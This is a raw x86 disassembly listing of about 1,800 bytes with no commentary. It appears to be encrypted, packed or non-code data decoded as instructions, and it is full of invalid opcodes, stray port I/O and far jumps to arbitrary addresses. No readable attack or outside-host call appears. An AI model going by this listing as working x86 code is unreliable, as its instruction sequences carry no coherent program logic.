  40fce6:	not    DWORD PTR [bx+di]
  40fce9:	dec    edi
  40fcea:	out    0x6e,eax
  40fcec:	adc    dl,BYTE PTR [edx+0x1c19bd26]
  40fcf2:	xor    dh,BYTE PTR [ecx+0x72]
  40fcf5:	inc    edi
  40fcf6:	test   DWORD PTR [ebp-0x22b6c5a8],edx
  40fcfc:	in     eax,0xa6
  40fcfe:	in     al,dx
  40fcff:	ja     0x40fcfe
  40fd01:	mov    al,ds:0xec1b8396
  40fd06:	jo     0x40fcd0
  40fd08:	dec    esi
  40fd09:	dec    edi
  40fd0a:	and    ebx,DWORD PTR [edi+0x66]
  40fd0d:	nop
  40fd0e:	stc    
  40fd0f:	test   DWORD PTR [ebx-0x5947d1b2],esi
  40fd15:	(bad)  
  40fd16:	sub    ecx,DWORD PTR [ecx+eax*8]
  40fd19:	ret    
  40fd1a:	ja     0x40fd97
  40fd1c:	stos   BYTE PTR es:[edi],al
  40fd1d:	push   ecx
  40fd1e:	and    ah,BYTE PTR [edi-0x4c1177d8]
  40fd24:	mov    cl,0xd1
  40fd26:	and    BYTE PTR [edi+0x2],al
  40fd29:	xchg   esp,eax
  40fd2a:	out    dx,al
  40fd2b:	mov    ebx,0x193ecadd
  40fd30:	and    al,0x81
  40fd32:	mov    bh,0x60
  40fd34:	test   DWORD PTR [esi],0xc6b2917a
  40fd3a:	bound  edi,QWORD PTR fs:[eax+0x46]
  40fd3e:	leave  
  40fd3f:	adc    cl,dh
  40fd41:	mov    ebx,0x36141f21
  40fd46:	mov    al,0x17
  40fd48:	jo     0x40fd62
  40fd4a:	call   0x87134c95
  40fd4f:	push   ss
  40fd50:	test   eax,0x936da4cc
  40fd55:	out    0x1e,eax
  40fd57:	add    al,BYTE PTR [ecx+ecx*8]
  40fd5a:	mov    al,0x16
  40fd5c:	xor    al,0x2d
  40fd5e:	or     al,BYTE PTR [edi+0x5b]
  40fd61:	arpl   WORD PTR [esi],di
  40fd63:	ss inc edx
  40fd65:	adc    DWORD PTR [edi],ebp
  40fd67:	xor    DWORD PTR [esi+0xf16fadd],esp
  40fd6d:	das    
  40fd6e:	iret   
  40fd6f:	jp     0x40fcfc
  40fd71:	and    BYTE PTR [ecx],al
  40fd73:	or     al,0xe4
  40fd75:	mov    ch,0x54
  40fd77:	push   eax
  40fd78:	daa    
  40fd79:	cmp    al,BYTE PTR [edx+0x59]
  40fd7c:	(bad)  
  40fd7d:	jne    0x40fdc3
  40fd7f:	mov    dh,0x2f
  40fd81:	sbb    dl,bl
  40fd83:	add    eax,0x366cc4bb
  40fd88:	sub    ch,al
  40fd8a:	scas   al,BYTE PTR es:[edi]
  40fd8b:	clc    
  40fd8c:	sub    dl,dl
  40fd8e:	bound  ebp,QWORD PTR [ebx-0x42255ccd]
  40fd94:	arpl   WORD PTR [edi+0x62],ax
  40fd97:	or     al,0x12
  40fd99:	call   0xbfa3c6fb
  40fd9e:	(bad)  
  40fd9f:	xchg   esp,eax
  40fda0:	icebp  
  40fda1:	iret   
  40fda2:	mov    ebx,0xf3d2ac1a
  40fda7:	xor    BYTE PTR [eax],al
  40fda9:	clc    
  40fdaa:	cmp    DWORD PTR [edi],eax
  40fdac:	push   0x32ac971d
  40fdb1:	dec    ecx
  40fdb2:	shl    BYTE PTR [edi+edx*4+0x64],1
  40fdb6:	fnstenv [edx-0x5a]
  40fdb9:	inc    ebx
  40fdba:	jns    0x40fd58
  40fdbc:	sti    
  40fdbd:	xor    ebx,DWORD PTR [ebx]
  40fdbf:	iret   
  40fdc0:	add    DWORD PTR [esi-0x2fc33afa],0x800d2bbd
  40fdca:	repnz push edi
  40fdcc:	out    dx,al
  40fdcd:	repnz in al,dx
  40fdcf:	dec    ecx
  40fdd0:	push   0x52
  40fdd2:	daa    
  40fdd3:	gs nop edx
  40fdd7:	mov    ds:0x58ca758f,al
  40fddc:	(bad)  
  40fddd:	sub    al,0x20
  40fde0:	les    edi,FWORD PTR [edi-0x33]
  40fde3:	outs   dx,DWORD PTR cs:[esi]
  40fde5:	cmp    dh,BYTE PTR [ebx]
  40fde7:	or     ebp,edi
  40fde9:	xor    BYTE PTR [edx],0x96
  40fdec:	(bad)  
  40fdee:	lock ins DWORD PTR es:[edi],dx
  40fdf0:	ficom  DWORD PTR [edi-0x72db5541]
  40fdf6:	jno    0x40fe4e
  40fdf8:	mov    cl,0x84
  40fdfa:	fs into 
  40fdfc:	leave  
  40fdfd:	mov    eax,ds:0x3ec1df6d
  40fe02:	nop
  40fe03:	mov    esi,0x6329ba8e
  40fe08:	sahf   
  40fe09:	shl    DWORD PTR [edx+edi*1],0x8c
  40fe0d:	ss into 
  40fe0f:	mov    esi,0x624178b0
  40fe14:	daa    
  40fe15:	or     DWORD PTR [edi],edi
  40fe17:	jae    0x40fe2e
  40fe19:	daa    
  40fe1a:	(bad)  
  40fe1b:	push   ss
  40fe1c:	imul   eax,DWORD PTR [edi+0x74],0xffffffd7
  40fe20:	mov    ah,0xc2
  40fe22:	and    al,0x7f
  40fe24:	pop    es
  40fe25:	icebp  
  40fe26:	inc    ebx
  40fe27:	jmp    0x98f749bc
  40fe2c:	or     dh,BYTE PTR [eax-0x4d23ba7d]
  40fe32:	add    eax,0x1010a07e
  40fe37:	xchg   edx,eax
  40fe38:	into   
  40fe39:	daa    
  40fe3a:	cwde   
  40fe3b:	lods   eax,DWORD PTR ds:[esi]
  40fe3c:	xchg   esp,eax
  40fe3d:	dec    esp
  40fe3e:	xor    DWORD PTR ds:0x9f3a2f6f,esp
  40fe44:	fdiv   QWORD PTR [ebp-0x71]
  40fe47:	push   edx
  40fe48:	cli    
  40fe49:	verw   WORD PTR [eax-0x74]
  40fe4d:	fistp  DWORD PTR [ebp+0x2b85ab6f]
  40fe53:	fwait
  40fe54:	add    al,0xe1
  40fe56:	test   al,0xab
  40fe58:	mov    eax,ds:0x10a48e35
  40fe5d:	loope  0x40fe9f
  40fe5f:	dec    edx
  40fe60:	or     bl,BYTE PTR [edx]
  40fe62:	add    dh,BYTE PTR [ecx+0x3f]
  40fe65:	dec    al
  40fe67:	mov    es,WORD PTR [ebp+0x55e06e2b]
  40fe6d:	inc    esp
  40fe6e:	mov    al,ds:0xfe81f5b0
  40fe73:	into   
  40fe74:	push   ebx
  40fe75:	pop    edx
  40fe76:	jb     0x40fea1
  40fe78:	data16 mov ch,0x22
  40fe7b:	in     eax,0xa7
  40fe7d:	aas    
  40fe7e:	retf   
  40fe7f:	inc    BYTE PTR [ebx]
  40fe81:	data16 mov ds,WORD PTR [ebp+0x3e]
  40fe85:	ins    BYTE PTR es:[edi],dx
  40fe86:	mov    gs,WORD PTR [ebx+eax*4+0x73]
  40fe8a:	inc    esi
  40fe8b:	frstor [ebx-0xbde25e1]
  40fe91:	stc    
  40fe92:	nop
  40fe93:	es xchg esi,eax
  40fe95:	mov    edx,0x46f574d1
  40fe9a:	pop    esp
  40fe9b:	push   ecx
  40fe9c:	loop   0x40fec6
  40fe9e:	mov    esp,0x56669dc1
  40fea3:	dec    ecx
  40fea4:	and    BYTE PTR [edi-0x4e],al
  40fea7:	or     BYTE PTR [edx-0x5035785a],dh
  40fead:	scas   eax,DWORD PTR es:[edi]
  40feae:	loopne 0x40fe5e
  40feb0:	jge    0x40fe97
  40feb2:	jb     0x40fe4d
  40feb4:	(bad)  
  40feb5:	jl     0x40febc
  40feb7:	jnp    0x40fe51
  40feb9:	sub    ebp,ecx
  40febb:	add    ebx,edi
  40febd:	xchg   edx,eax
  40febe:	sub    BYTE PTR [edi+0x481afe71],dl
  40fec4:	or     edi,edi
  40fec6:	sub    eax,0x7d2f5dbc
  40fecb:	mov    ds:0xc38aa875,eax
  40fed0:	and    al,0x6b
  40fed2:	int    0x70
  40fed4:	sahf   
  40fed5:	ret    
  40fed6:	call   0x9a5e0f6e
  40fedb:	mov    DWORD PTR [edx],esp
  40fedd:	ins    DWORD PTR es:[edi],dx
  40fede:	add    ch,ch
  40fee0:	push   cs
  40fee1:	sub    al,0x9d
  40fee3:	adc    eax,0x29c416e3
  40fee8:	xor    bh,ah
  40feea:	xlat   BYTE PTR ds:[ebx]
  40feeb:	ins    DWORD PTR es:[edi],dx
  40feec:	jo     0x40ff0a
  40feee:	push   ss
  40feef:	mov    eax,0x94c841d4
  40fef4:	fisttp WORD PTR [eax+0x76]
  40fef7:	dec    eax
  40fef8:	mov    ebx,0x65d5a653
  40fefd:	scas   eax,DWORD PTR es:[edi]
  40fefe:	or     BYTE PTR [edi+0x41],0x63
  40ff02:	or     BYTE PTR [ebx],ch
  40ff04:	popa   
  40ff05:	bound  edi,QWORD PTR [ebx]
  40ff07:	scas   al,BYTE PTR es:[edi]
  40ff08:	mul    BYTE PTR [edx]
  40ff0a:	push   0xbe3dfe2c
  40ff0f:	loopne 0x40ff48
  40ff11:	aam    0xb6
  40ff13:	xchg   DWORD PTR [eax-0x35d0d9b4],edi
  40ff19:	push   esp
  40ff1a:	cmovae edi,DWORD PTR [esp+ebx*8-0x3af799a7]
  40ff22:	sahf   
  40ff23:	mov    ds:0xcd944d2b,al
  40ff28:	push   ecx
  40ff29:	mov    DWORD PTR [esi],esi
  40ff2b:	repz add eax,0x93add5c1
  40ff31:	push   ebx
  40ff32:	push   ebp
  40ff33:	lock jg 0x40ff68
  40ff36:	lds    ebp,FWORD PTR [edi-0xe3d7af7]
  40ff3c:	mov    al,BYTE PTR [eax-0x2b6fb0c9]
  40ff42:	sahf   
  40ff43:	xchg   BYTE PTR [edx-0x5702cbd6],ah
  40ff49:	outs   dx,DWORD PTR ds:[esi]
  40ff4a:	clc    
  40ff4b:	inc    ecx
  40ff4c:	or     DWORD PTR [edx-0x54],edx
  40ff4f:	pop    DWORD PTR [eax]
  40ff51:	loope  0x40ff91
  40ff53:	xchg   BYTE PTR [edx-0x5e],dh
  40ff56:	pop    esp
  40ff57:	scas   eax,DWORD PTR es:[edi]
  40ff58:	xlat   BYTE PTR ds:[ebx]
  40ff59:	cmp    esi,DWORD PTR [edi-0x7c0669a]
  40ff5f:	test   BYTE PTR [ecx+0x30],bl
  40ff62:	mov    bl,0x7c
  40ff64:	mov    ch,0x9a
  40ff66:	pop    eax
  40ff67:	cld    
  40ff68:	pop    ecx
  40ff69:	add    DWORD PTR [eax-0x1d],ebx
  40ff6c:	pop    edi
  40ff6d:	out    dx,al
  40ff6e:	outs   dx,BYTE PTR ds:[esi]
  40ff6f:	jbe    0x40ff4c
  40ff71:	ins    BYTE PTR es:[edi],dx
  40ff72:	push   ds
  40ff73:	inc    esp
  40ff74:	xchg   esp,eax
  40ff75:	dec    ecx
  40ff76:	pushf  
  40ff77:	mov    eax,ds:0x2854b294
  40ff7c:	mov    ebx,ecx
  40ff7e:	xor    dl,dl
  40ff80:	ja     0x40ffe9
  40ff82:	lahf   
  40ff83:	in     al,0x15
  40ff85:	shl    DWORD PTR [esi],1
  40ff87:	xchg   ecx,eax
  40ff88:	mov    ah,0x8e
  40ff8a:	sbb    DWORD PTR [edx],edi
  40ff8c:	mov    bh,0xed
  40ff8e:	sti    
  40ff8f:	mov    bh,0x5e
  40ff91:	add    ch,BYTE PTR [edi]
  40ff93:	sar    BYTE PTR [ecx+ebx*2+0x25ba7339],cl
  40ff9a:	bound  esp,QWORD PTR [esi-0x6283ab1d]
  40ffa0:	std    
  40ffa1:	sti    
  40ffa2:	push   esi
  40ffa3:	scas   eax,DWORD PTR es:[edi]
  40ffa4:	daa    
  40ffa5:	add    esp,DWORD PTR [eax]
  40ffa7:	cmp    eax,0x66f7c773
  40ffac:	test   DWORD PTR [ebx+edx*8-0x51],ecx
  40ffb0:	popa   
  40ffb1:	ss dec edi
  40ffb3:	mov    eax,ds:0xb140a929
  40ffb8:	push   ecx
  40ffb9:	mov    ebp,0x5edfcad3
  40ffbe:	fs jae 0x40ff69
  40ffc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffc2:	or     BYTE PTR ds:0xa0be00b0,0x56
  40ffc9:	shr    ebp,cl
  40ffcb:	cmp    al,0x8e
  40ffcd:	add    al,0xa6
  40ffcf:	jne    0x40ff8a
  40ffd1:	imul   ebp,DWORD PTR [edx+esi*1+0x67c215a6],0xbf978b54
  40ffdc:	mov    edi,0x33c75d22
  40ffe1:	cwde   
  40ffe2:	(bad)  
  40ffe3:	cmp    dh,BYTE PTR [ebp+0xc]
  40ffe6:	xlat   BYTE PTR ds:[ebx]
  40ffe7:	xchg   esp,ebx
  40ffe9:	ret    0x552e
  40ffec:	popf   
  40ffed:	jb     0x410027
  40ffef:	cmp    DWORD PTR [edi+0x62e0e2c],edi
  40fff5:	aas    
  40fff6:	jecxz  0x410008
  40fff8:	push   DWORD PTR [ecx+0x93c5821]
  40fffe:	mov    eax,ds:0x99b1e5b8
  410003:	dec    esi
  410004:	fidiv  DWORD PTR [ecx-0x4b800a15]
  41000a:	or     ch,cl
  41000c:	call   0x2323c9b7
  410011:	and    esp,DWORD PTR [eax+ebx*2]
  410014:	fwait
  410015:	cli    
  410016:	or     BYTE PTR [edi],bl
  410018:	push   ss
  410019:	cld    
  41001a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41001b:	scas   al,BYTE PTR es:[edi]
  41001c:	into   
  41001d:	repz (bad)
  410020:	cld    
  410021:	daa    
  410022:	mov    edx,0x57d42f1f
  410027:	mov    eax,ds:0x81fc00b6
  41002c:	js     0x40ffdf
  41002e:	js     0x41001e
  410030:	dec    edx
  410031:	or     eax,0x94990849
  410036:	dec    edx
  410037:	push   0x6df07c96
  41003c:	push   0x56130bce
  410041:	and    cl,BYTE PTR [esi-0x51b716c9]
  410047:	cmp    al,0xda
  410049:	inc    edi
  41004a:	mov    bh,0x98
  41004c:	inc    ebp
  41004d:	sbb    al,dl
  41004f:	int3   
  410050:	and    DWORD PTR [edx-0x43dbd95e],0x72
  410057:	fld    QWORD PTR [ebx+0x18161b34]
  41005d:	or     DWORD PTR [edx+0x127ef65b],edx
  410063:	jp     0x41003b
  410065:	xchg   ecx,eax
  410066:	(bad)  
  410067:	repz cmp cl,BYTE PTR [ecx+esi*2-0x515b19b0]
  41006f:	fnstenv [eax+0x3151c078]
  410075:	leave  
  410076:	add    ecx,DWORD PTR [esi-0x63]
  410079:	or     al,0xfa
  41007b:	push   es
  41007c:	stc    
  41007d:	ret    
  41007e:	push   ds
  41007f:	inc    ebp
  410080:	addr16 retf 0x8aa8
  410084:	push   ecx
  410085:	dec    ebx
  410086:	dec    edx
  410087:	cs in  al,0xb3
  41008a:	add    eax,0xce8d099b
  41008f:	fucom  st(4)
  410091:	pop    es
  410092:	icebp  
  410093:	imul   eax,DWORD PTR [edi],0x1f33140
  410099:	mov    ch,0xb2
  41009b:	jecxz  0x410046
  41009d:	aaa    
  41009e:	hlt    
  41009f:	addr16 mov ds:0x219,eax
  4100a3:	sub    esi,esp
  4100a5:	out    dx,eax
  4100a6:	mov    dl,0x49
  4100a8:	lock push 0x12
  4100ab:	mov    cl,0x5c
  4100ad:	ror    DWORD PTR [edi+eax*2+0x7b],1
  4100b1:	adc    eax,DWORD PTR [ebx+0x464952f8]
  4100b7:	and    BYTE PTR [ecx+ecx*2],al
  4100ba:	cmp    eax,0x2e701a10
  4100bf:	push   edi
  4100c0:	dec    edi
  4100c1:	push   es
  4100c2:	bound  ebx,QWORD PTR [edi+ebx*4+0x57]
  4100c6:	stos   DWORD PTR es:[edi],eax
  4100c7:	push   0xda668f78
  4100cc:	je     0x4100b8
  4100ce:	inc    esp
  4100cf:	clc    
  4100d0:	leave  
  4100d1:	sub    BYTE PTR [esi+ebx*2-0x4be94c8e],bh
  4100d8:	test   BYTE PTR [ebp-0x32],0xf6
  4100dc:	lds    esp,FWORD PTR [ebx-0x52702c33]
  4100e2:	mov    DWORD PTR [edi],edx
  4100e4:	js     0x410129
  4100e6:	add    DWORD PTR [edx+0x6c],ebx
  4100e9:	and    DWORD PTR [edx],ebp
  4100eb:	sbb    edx,DWORD PTR [ecx]
  4100ed:	pop    edx
  4100ee:	fstp   DWORD PTR ds:[esi+0x636c6884]
  4100f5:	and    eax,0xd45e251d
  4100fa:	xchg   ebx,eax
  4100fb:	pusha  
  4100fc:	sub    esp,DWORD PTR [ebp+0x33]
  4100ff:	mov    al,ds:0xd22d2ccc
  410104:	sbb    eax,0x5790d6c6
  410109:	leave  
  41010a:	test   DWORD PTR [eax-0x62],0x5a303b93
  410111:	scas   al,BYTE PTR es:[edi]
  410112:	inc    edi
  410113:	push   ebp
  410114:	mov    bl,0xb4
  410116:	add    DWORD PTR [esi-0x19],ebx
  410119:	xchg   esi,eax
  41011a:	inc    esp
  41011b:	pushf  
  41011c:	add    eax,0x9a6ebc40
  410121:	aas    
  410122:	push   0x4b
  410124:	pushf  
  410125:	cdq    
  410126:	lahf   
  410127:	lock xor BYTE PTR [esi],0xb7
  41012b:	in     eax,0xce
  41012d:	mov    ds:0xc64a37be,eax
  410132:	test   eax,0x657ef236
  410137:	mov    edi,0xea920e0a
  41013c:	fmul   st,st(4)
  41013e:	adc    BYTE PTR [ebp-0x4a],bl
  410141:	in     al,0x99
  410143:	sub    esi,DWORD PTR [ecx-0x1b866269]
  410149:	imul   esp,DWORD PTR [esi+0x1d7b2b06],0x88a636a1
  410153:	sub    al,0x43
  410155:	fidiv  WORD PTR [edx]
  410157:	adc    cl,ch
  410159:	sub    al,0x18
  41015b:	imul   ebx,DWORD PTR [ecx+0x51],0xeebf00eb
  410162:	cld    
  410163:	pushf  
  410164:	push   ebp
  410165:	fs inc ebp
  410167:	xor    al,0x36
  410169:	jae    0x410140
  41016b:	mov    edi,0xbce346c2
  410170:	ins    DWORD PTR es:[edi],dx
  410171:	mov    bh,0xe2
  410173:	push   ds
  410174:	cli    
  410175:	leave  
  410176:	mov    al,ds:0xef5f7cff
  41017b:	xor    al,0x8f
  41017d:	(bad)  
  41017e:	loope  0x4101a8
  410180:	mov    esi,0xe3d9ff75
  410185:	cmp    edx,DWORD PTR [edx]
  410187:	mov    ebp,0x50ebfb7f
  41018c:	leave  
  41018d:	aad    0x0
  41018f:	lahf   
  410190:	inc    edx
  410191:	push   ebp
  410192:	xor    DWORD PTR [edx-0x620c4078],0xad93955
  41019c:	or     DWORD PTR [esi-0x7f],edx
  41019f:	adc    BYTE PTR [eax-0x2fe6b143],bh
  4101a5:	inc    esi
  4101a6:	push   esi
  4101a7:	das    
  4101a8:	xchg   BYTE PTR [ebx],ah
  4101aa:	sub    edi,DWORD PTR [eax+0x21]
  4101ad:	inc    esp
  4101ae:	es sbb eax,0xb2a76d4e
  4101b4:	push   edi
  4101b5:	mov    ecx,0xb54a2437
  4101ba:	pop    ds
  4101bb:	mov    ds:0xc547bff0,al
  4101c0:	cmp    eax,ebp
  4101c2:	inc    ebx
  4101c3:	test   al,0x1b
  4101c5:	test   al,0xaa
  4101c7:	or     edx,DWORD PTR [ecx-0x3e]
  4101ca:	and    al,0xba
  4101cc:	mov    WORD PTR [esi+0x42883933],ss
  4101d2:	in     al,dx
  4101d3:	or     esp,DWORD PTR [eax-0x7f]
  4101d6:	mov    esi,0xb0839491
  4101db:	dec    esp
  4101dc:	stc    
  4101dd:	cmc    
  4101de:	push   0x2228b7f9
  4101e3:	inc    edi
  4101e4:	inc    edi
  4101e5:	mov    eax,ds:0x67c22ead
  4101ea:	out    0xc0,al
  4101ec:	sub    eax,0x71477d2b
  4101f1:	sbb    eax,0xf1d34c67
  4101f6:	adc    bh,BYTE PTR [ecx-0x3f27e50d]
  4101fc:	lahf   
  4101fd:	(bad)  
  4101fe:	jno    0x41021d
  410200:	aaa    
  410201:	out    0xa,al
  410203:	out    dx,eax
  410204:	cdq    
  410205:	adc    DWORD PTR [edx-0x36bcac48],ebp
  41020b:	repnz pop ecx
  41020d:	or     DWORD PTR [ebp+0x3d],ebp
  410210:	lock shr DWORD PTR [ecx],cl
  410213:	mov    fs:0x54b8cd8c,al
  410219:	mov    esp,0x6459f2c5
  41021e:	or     al,0xb1
  410220:	repnz stos BYTE PTR es:[edi],al
  410222:	jmp    0x4101f9
  410224:	fidiv  DWORD PTR [edi]
  410226:	ror    BYTE PTR [esi+0x52],1
  410229:	mov    dl,BYTE PTR [eax+0x8]
  41022c:	sub    ecx,esi
  41022e:	pop    ecx
  41022f:	cmp    BYTE PTR [edi],al
  410231:	stos   DWORD PTR es:[edi],eax
  410232:	add    BYTE PTR [esi],0x99
  410235:	jns    0x4102b4
  410237:	hlt    
  410238:	adc    eax,0xe0560111
  41023d:	jl     0x41024e
  41023f:	add    al,0x40
  410241:	(bad)
  410244:	inc    ecx
  410245:	mov    DWORD PTR [ebp-0x55],esp
  410248:	mov    bl,0xb6
  41024a:	jmp    0x382b85ba
  41024f:	push   esp
  410250:	push   0x532806c7
  410255:	loop   0x410254
  410257:	ss inc edi
  410259:	fst    QWORD PTR [eax+0x68829e0]
  41025f:	adc    BYTE PTR [ebp-0x5d],dh
  410262:	loope  0x4102d5
  410264:	push   0x15
  410266:	(bad)  
  410267:	hlt    
  410268:	xchg   ebx,eax
  410269:	mov    ebp,0x889e65d6
  41026e:	std    
  41026f:	jns    0x4102bc
  410271:	rcr    DWORD PTR [eax+0x6419aace],0x90
  410278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410279:	xchg   ebp,eax
  41027a:	lods   eax,DWORD PTR ds:[esi]
  41027b:	cmp    DWORD PTR [ecx-0x2a],eax
  41027e:	mov    eax,ds:0xab30f4bd
  410283:	xchg   BYTE PTR [esi+0x279b7f7b],bh
  410289:	sahf   
  41028a:	repz retf 0x723c
  41028e:	(bad)  [edx-0xa]
  410291:	dec    esi
  410292:	(bad)  
  410293:	mov    BYTE PTR [edi-0x4260ef79],bh
  410299:	int    0xf4
  41029b:	pop    es
  41029c:	inc    ecx
  41029d:	fnsave [ebp+0xd]
  4102a0:	addr16 mov ebx,0xf83dc7e9
  4102a6:	add    al,0xe1
  4102a8:	mov    ebp,0x1d3e1377
  4102ad:	(bad)  
  4102ae:	mov    esi,0x4024b8be
  4102b3:	adc    dh,cl
  4102b5:	sbb    DWORD PTR [edi+0x67e7cb6],edx
  4102bb:	jno    0x410339
  4102bd:	lds    esp,FWORD PTR [edi]
  4102bf:	lahf   
  4102c0:	cmp    cl,0x47
  4102c3:	mov    bl,BYTE PTR [ecx+0x53]
  4102c6:	cld    
  4102c7:	dec    ebp
  4102c8:	push   ss
  4102c9:	push   edi
  4102ca:	cmp    ebx,ebx
  4102cc:	call   0x5b7c8013
  4102d1:	add    cl,BYTE PTR [esi]
  4102d3:	jecxz  0x4102a4
  4102d5:	sub    al,0x5a
  4102d7:	dec    ebp
  4102d8:	jmp    0xc1c1:0x1b1848d6
  4102df:	daa    
  4102e0:	inc    eax
  4102e1:	add    cl,BYTE PTR [edi+0xe]
  4102e4:	test   DWORD PTR [ebx-0x47],edx
  4102e7:	pop    ecx
  4102e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102e9:	(bad)  
  4102ea:	and    al,0x74
  4102ec:	xor    DWORD PTR ds:0x8a154cf3,0x91cab831
  4102f6:	mov    fs,WORD PTR [edi]
  4102f8:	mov    eax,0xa6da53c4
  4102fd:	mov    ds:0xc7a80941,al
  410302:	and    dl,dl
  410304:	repz mov ebx,DWORD PTR [esi]
  410307:	jmp    0x63b9ae30
  41030c:	out    dx,al
  41030d:	pop    esi
  41030e:	adc    eax,0x4064d7e3
  410313:	repnz or DWORD PTR [ecx-0x70],edi
  410317:	jle    0x4102e1
  410319:	lods   eax,DWORD PTR ds:[esi]
  41031a:	adc    eax,edi
  41031c:	fs push esp
  41031e:	push   0xffffffc2
  410320:	cdq    
  410321:	sbb    al,BYTE PTR [ecx]
  410323:	and    BYTE PTR [edx],0x4
  410326:	push   esp
  410327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410328:	jp     0x4102b6
  41032a:	outs   dx,BYTE PTR ds:[esi]
  41032b:	or     eax,0xec686b59
  410330:	dec    ebx
  410331:	sbb    ebx,DWORD PTR [ecx]
  410333:	sub    bl,ch
  410335:	push   ss
  410336:	adc    dh,BYTE PTR [edi-0xb]
  410339:	retf   0x4358
  41033c:	push   ebp
  41033d:	fidiv  DWORD PTR [esi]
  41033f:	pop    ebx
  410340:	retf   
  410341:	or     ebp,edx
  410343:	pop    esp
  410344:	sar    DWORD PTR ds:0x2d891964,1
  41034a:	pushf  
  41034b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41034c:	pop    DWORD PTR [esi*4-0x29857ce7]
  410353:	ins    BYTE PTR es:[edi],dx
  410354:	outs   dx,BYTE PTR ds:[esi]
  410355:	jnp    0x4103c7
  410357:	in     eax,0x7b
  410359:	push   ds
  41035a:	(bad)  
  41035b:	lods   al,BYTE PTR ds:[esi]
  41035c:	jo     0x41033a
  41035e:	mov    si,0x1137
  410362:	jmp    0xbf89:0x6cf20a34
  410369:	and    ah,bl
  41036b:	inc    edx
  41036c:	mov    eax,ds:0xdafb7ada
  410371:	jecxz  0x410370
  410373:	and    BYTE PTR [ebp-0xd],0xae
  410377:	xchg   esi,eax
  410378:	out    0x9b,al
  41037a:	rcl    DWORD PTR [esi+eiz*4-0x4f],cl
  41037e:	dec    edi
  41037f:	daa    
  410380:	xchg   ebp,eax
  410381:	mov    ch,0xa5
  410383:	push   ds
  410384:	dec    ebp
  410385:	and    BYTE PTR [eax-0x41],bl
  410388:	ins    DWORD PTR es:[edi],dx
  410389:	rcr    BYTE PTR [esp+ebp*8+0x27],1
  41038d:	xchg   esp,eax
  41038e:	xor    DWORD PTR [ebx-0x5c],0xffffffa1
  410392:	push   0xb646fc08
  410397:	ins    DWORD PTR es:[edi],dx
  410398:	fimul  WORD PTR [ebx+0x65aa107f]
  41039e:	mov    dh,0x92
  4103a0:	adc    ebp,esp
  4103a2:	dec    eax
  4103a3:	sub    bl,BYTE PTR [esi]
  4103a5:	fs int 0x19
  4103a8:	xor    al,0xd
  4103aa:	iret   
  4103ab:	mov    al,0xec
  4103ad:	pop    esp
  4103ae:	add    dl,0x3
  4103b1:	add    BYTE PTR [ebp-0x80],bh
  4103b4:	rdmsr  
  4103b6:	jmp    0x5073:0x779a80d
  4103bd:	ret    
  4103be:	or     al,0x18
  4103c0:	(bad)  
  4103c1:	cdq    
  4103c2:	imul   eax,DWORD PTR [edx],0x27
  4103c5:	mov    ah,BYTE PTR [esi-0x26]
  4103c8:	aam    0xb6
  4103ca:	mov    WORD PTR ds:0x4b6aab02,ss
  4103d0:	leave  
  4103d1:	fwait
  4103d2:	sub    edx,DWORD PTR [edx+0x222a8935]
  4103d8:	fucomp st(0)
  4103da:	(bad)  
  4103db:	jns    0x41044a
  4103dd:	sti    
  4103de:	fsubr  DWORD PTR [edi]
  4103e0:	shl    BYTE PTR [eax],cl
  4103e2:	mov    esp,0x8690213
  4103e7:	mov    ch,0x29
  4103e9:	mov    eax,ds:0x15ac1895
  4103ee:	mov    ds:0x9a668805,eax
  4103f3:	nop
  4103f4:	icebp  
  4103f5:	and    eax,0xe6b1da5c
  4103fa:	int    0x99
  4103fc:	sub    ebx,DWORD PTR [ecx+0x651992ab]
  410402:	in     al,dx
  410403:	shr    DWORD PTR [eax-0x47734f83],1
  410409:	aaa    
  41040a:	add    eax,0xd0f49bfa
  41040f:	in     eax,dx
  410410:	jmp    FWORD PTR [esi+0x70a2599e]
  410416:	cmp    eax,0x6d45d91a
  41041b:	mov    bh,0xef
  41041d:	fbld   TBYTE PTR [eax+ebx*4]
  410420:	or     al,0x87
  410422:	or     eax,DWORD PTR ds:0xa98178d2
  410428:	hlt    
  410429:	inc    ebp
  41042a:	enter  0xcc88,0x10
  41042e:	jmp    0xa5ab:0x2430662f
  410435:	or     BYTE PTR [edi+edi*2+0x5ef383ef],ch
  41043c:	outs   dx,DWORD PTR ds:[esi]
  41043d:	iret   
  41043e:	sbb    eax,0xebf64249
  410443:	inc    ecx
  410444:	jns    0x410434
  410446:	push   ds
  410447:	mov    bh,0x9c
  410449:	mov    edi,0x8bd1f461
  41044e:	sar    esi,0x3
  410451:	and    DWORD PTR [edi],edi
  410453:	mov    edx,0xde390d17
  410458:	jnp    0x4104cd
  41045a:	cmp    al,0x78
  41045c:	test   eax,0x5a93d196
  410461:	rol    DWORD PTR [ebx-0x73490bb1],cl
  410467:	or     cl,BYTE PTR [ecx]
  410469:	jnp    0x410431
  41046b:	fcmovnbe st,st(3)
  41046d:	and    esi,ebx
  41046f:	or     cl,BYTE PTR [esi]
  410471:	adc    eax,ecx
  410473:	pop    ss
  410474:	inc    ecx
  410475:	leave  
  410476:	xor    DWORD PTR [edi],ebp
  410478:	es and eax,0xe8a18e37
  41047e:	fbld   TBYTE PTR [eax]
  410480:	mov    edi,0xa584daa5
  410485:	or     ebx,ebx
  410487:	push   0xffffff96
  410489:	scas   al,BYTE PTR es:[edi]
  41048a:	retf   0x6a71
  41048d:	jns    0x410459
  41048f:	repz out dx,eax
  410491:	out    dx,eax
  410492:	loopne 0x4104b1
  410494:	mov    cx,0x442e
  410498:	ins    BYTE PTR es:[edi],dx
  410499:	repnz mov ds:0x51634e64,eax
  41049f:	or     cl,BYTE PTR [ebx-0x3b09d01a]
  4104a5:	mov    dl,0xe0
  4104a7:	ins    BYTE PTR es:[edi],dx
  4104a8:	mov    DWORD PTR [ebx-0x5a853dd5],esi
  4104ae:	bound  ebx,QWORD PTR [edx]
  4104b0:	inc    edx
  4104b1:	test   al,0x23
  4104b3:	lods   eax,DWORD PTR ds:[esi]
  4104b4:	sbb    edi,ebx
  4104b6:	mov    ah,bh
  4104b8:	jp     0x41049e
  4104ba:	push   ss
  4104bb:	aad    0xda
  4104bd:	aas    
  4104be:	aad    0x36
  4104c0:	out    0x29,eax
